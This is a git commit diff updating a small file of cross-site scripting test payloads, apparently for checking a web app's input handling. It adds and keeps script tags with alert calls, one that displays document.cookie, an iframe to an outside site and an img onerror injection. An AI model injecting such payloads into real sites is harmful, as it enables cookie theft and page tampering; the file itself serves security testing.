f7126d67d6b3175cd2691ef314357037978b4c7b
ChengShen514 <66522193+chengshenUNSW@users.noreply.github.com>
2023-04-19 18:12:27 +0100

    Update attack_xxs_both.js

--- attack_xxs_both.js
+++ attack_xxs_both.js
@@ -1,5 +1,9 @@
+// test basic attacks
 <script>alert("This is a XSS Exploit Test")</script>
 
-<iframe src="http://www.cnn.com"></iframe>
+<iframe src="http://www.youtube.com"></iframe>
 
 <script>alert(document.cookie)</script>
+
+// test more tricky attacks
+<img src=x onerror=\"alert('Please buy shimmer's glasses!')\">
